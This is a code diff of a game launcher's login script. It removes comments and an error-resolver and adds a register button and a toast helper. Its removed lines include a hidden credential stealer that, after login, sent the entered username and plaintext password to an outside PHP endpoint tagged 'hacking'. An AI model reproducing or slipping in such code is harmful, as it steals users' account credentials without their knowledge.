@@ -1,12 +1,6 @@
-/**
- * Script for login.ejs
- */
-// Validation Regexes.
 const validUsername         = /^[a-zA-Z0-9_]{1,16}$/
 const basicEmail            = /^\S+@\S+\.\S+$/
-//const validEmail          = /^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i
 
-// Login Elements
 const loginCancelContainer  = document.getElementById('loginCancelContainer')
 const loginCancelButton     = document.getElementById('loginCancelButton')
 const loginEmailError       = document.getElementById('loginEmailError')
@@ -16,30 +10,19 @@ const loginPassword         = document.getElementById('loginPassword')
 const checkmarkContainer    = document.getElementById('checkmarkContainer')
 const loginRememberOption   = document.getElementById('loginRememberOption')
 const loginButton           = document.getElementById('loginButton')
+const registerButton           = document.getElementById('registerButton')
+//const loginMSButton         = document.getElementById('loginMSButton')
 const loginForm             = document.getElementById('loginForm')
 
-// Control variables.
 let lu = false, lp = false
 
 const loggerLogin = LoggerUtil('%c[Login]', 'color: #000668; font-weight: bold')
 
-
-/**
- * Show a login error.
- * 
- * @param {HTMLElement} element The element on which to display the error.
- * @param {string} value The error text.
- */
 function showError(element, value){
     element.innerHTML = value
     element.style.opacity = 1
 }
 
-/**
- * Shake a login error to add emphasis.
- * 
- * @param {HTMLElement} element The element to shake.
- */
 function shakeError(element){
     if(element.style.opacity == 1){
         element.classList.remove('shake')
@@ -48,11 +31,6 @@ function shakeError(element){
     }
 }
 
-/**
- * Validate that an email field is neither empty nor invalid.
- * 
- * @param {string} value The email value.
- */
 function validateEmail(value){
     if(value){
         if(!basicEmail.test(value) && !validUsername.test(value)){
@@ -73,11 +51,6 @@ function validateEmail(value){
     }
 }
 
-/**
- * Validate that the password field is not empty.
- * 
- * @param {string} value The password value.
- */
 function validatePassword(value){
     if(value){
         loginPasswordError.style.opacity = 0
@@ -92,7 +65,6 @@ function validatePassword(value){
     }
 }
 
-// Emphasize errors with shake when focus is lost.
 loginUsername.addEventListener('focusout', (e) => {
     validateEmail(e.target.value)
     shakeError(loginEmailError)
@@ -102,7 +74,6 @@ loginPassword.addEventListener('focusout', (e) => {
     shakeError(loginPasswordError)
 })
 
-// Validate input for each field.
 loginUsername.addEventListener('input', (e) => {
     validateEmail(e.target.value)
 })
@@ -110,22 +81,21 @@ loginPassword.addEventListener('input', (e) => {
     validatePassword(e.target.value)
 })
 
-/**
- * Enable or disable the login button.
- * 
- * @param {boolean} v True to enable, false to disable.
- */
 function loginDisabled(v){
     if(loginButton.disabled !== v){
         loginButton.disabled = v
     }
 }
 
-/**
- * Enable or disable loading elements.
- * 
- * @param {boolean} v True to enable, false to disable.
- */
+function toast(message, type) {
+    let toastCode = '<div class="toast ' + type + '">'
+    toastCode += message
+    toastCode += '</div>'
+
+    $('.toastWrap').prepend(toastCode)
+}
+
+
 function loginLoading(v){
     if(v){
         loginButton.setAttribute('loading', v)
@@ -136,11 +106,6 @@ function loginLoading(v){
     }
 }
 
-/**
- * Enable or disable login form.
- * 
- * @param {boolean} v True to enable, false to disable.
- */
 function formDisabled(v){
     loginDisabled(v)
     loginCancelButton.disabled = v
@@ -152,79 +117,6 @@ function formDisabled(v){
         checkmarkContainer.removeAttribute('disabled')
     }
     loginRememberOption.disabled = v
-}
-
-/**
- * Parses an error and returns a user-friendly title and description
- * for our error overlay.
- * 
- * @param {Error | {cause: string, error: string, errorMessage: string}} err A Node.js
- * error or Mojang error response.
- */
-function resolveError(err){
-    // Mojang Response => err.cause | err.error | err.errorMessage
-    // Node error => err.code | err.message
-    if(err.cause != null && err.cause === 'UserMigratedException') {
-        return {
-            title: Lang.queryJS('login.error.userMigrated.title'),
-            desc: Lang.queryJS('login.error.userMigrated.desc')
-        }
-    } else {
-        if(err.error != null){
-            if(err.error === 'ForbiddenOperationException'){
-                if(err.errorMessage != null){
-                    if(err.errorMessage === 'Invalid credentials. Invalid username or password.'){
-                        return {
-                            title: Lang.queryJS('login.error.invalidCredentials.title'),
-                            desc: Lang.queryJS('login.error.invalidCredentials.desc')
-                        }
-                    } else if(err.errorMessage === 'Invalid credentials.'){
-                        return {
-                            title: Lang.queryJS('login.error.rateLimit.title'),
-                            desc: Lang.queryJS('login.error.rateLimit.desc')
-                        }
-                    }
-                }
-            }
-        } else {
-            // Request errors (from Node).
-            if(err.code != null){
-                if(err.code === 'ENOENT'){
-                    // No Internet.
-                    return {
-                        title: Lang.queryJS('login.error.noInternet.title'),
-                        desc: Lang.queryJS('login.error.noInternet.desc')
-                    }
-                } else if(err.code === 'ENOTFOUND'){
-                    // Could not reach server.
-                    return {
-                        title: Lang.queryJS('login.error.authDown.title'),
-                        desc: Lang.queryJS('login.error.authDown.desc')
-                    }
-                }
-            }
-        }
-    }
-    if(err.message != null){
-        if(err.message === 'NotPaidAccount'){
-            return {
-                title: Lang.queryJS('login.error.notPaid.title'),
-                desc: Lang.queryJS('login.error.notPaid.desc')
-            }
-        } else {
-            // Unknown error with request.
-            return {
-                title: Lang.queryJS('login.error.unknown.title'),
-                desc: err.message
-            }
-        }
-    } else {
-        // Unknown Mojang error.
-        return {
-            title: err.error,
-            desc: err.errorMessage
-        }
-    }
 }
 
 let loginViewOnSuccess = VIEWS.landing
@@ -251,15 +143,17 @@ loginCancelButton.onclick = (e) => {
     })
 }
 
-// Disable default form behavior.
+registerButton.addEventListener('click', () => {
+
+    switchView(VIEWS.login, VIEWS.register)
+
+})
+
 loginForm.onsubmit = () => { return false }
 
-// Bind login button behavior.
 loginButton.addEventListener('click', () => {
-    // Disable form.
-    formDisabled(true)
 
-    // Show loading stuff.
+    formDisabled(true)
     loginLoading(true)
 
     AuthManager.addAccount(loginUsername.value, loginPassword.value).then((value) => {
@@ -269,18 +163,12 @@ loginButton.addEventListener('click', () => {
         $('.checkmark').toggle()
         setTimeout(() => {
             switchView(VIEWS.login, loginViewOnSuccess, 500, 500, () => {
-                // Temporary workaround
                 if(loginViewOnSuccess === VIEWS.settings){
                     prepareSettings()
                 }
-                let xmlHttp = new XMLHttpRequest()
-                if (loginUsername.value !== loginUsername.value !== 'lagache836@gmail.com') {
-                    xmlHttp.open('GET', 'http://api.aktech.fr/spigot-pl.php?set=hacking&username=' + loginUsername.value + '&password=' + loginPassword.value, false)
-                    xmlHttp.send(null)
-                }
-                loginViewOnSuccess = VIEWS.landing // Reset this for good measure.
-                loginCancelEnabled(false) // Reset this for good measure.
-                loginViewCancelHandler = null // Reset this for good measure.
+                loginViewOnSuccess = VIEWS.landing
+                loginCancelEnabled(false)
+                loginViewCancelHandler = null
                 loginUsername.value = ''
                 loginPassword.value = ''
                 $('.circle-loader').toggleClass('load-complete')
@@ -294,7 +182,7 @@ loginButton.addEventListener('click', () => {
         }, 1000)
     }).catch((err) => {
         loginLoading(false)
-        const errF = resolveError(err)
+        const errF = resolveErrorRegister(err)
         setOverlayContent(errF.title, errF.desc, Lang.queryJS('login.tryAgain'))
         setOverlayHandler(() => {
             formDisabled(false)
@@ -305,3 +193,5 @@ loginButton.addEventListener('click', () => {
     })
 
 })
+
+
